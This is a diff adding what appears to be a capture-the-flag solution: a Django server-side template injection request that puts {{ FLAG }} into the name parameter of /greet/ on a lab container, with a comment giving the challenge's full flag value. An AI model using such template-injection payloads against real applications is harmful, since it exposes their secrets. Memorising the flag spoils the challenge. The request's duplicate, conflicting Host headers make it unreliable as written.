@@ -1,0 +1,5 @@
+# Django SSTI: inject {{ FLAG }} into name param to extract /flag.txt contents. Context: {'FLAG': 'flag{fa1d018a-9a02-4ccb-a2d4-98ec79c62603}'}
+
+GET /greet/?name={{ FLAG }} HTTP/1.1
+Host: 172.17.0.1:44953
+Host: localhost
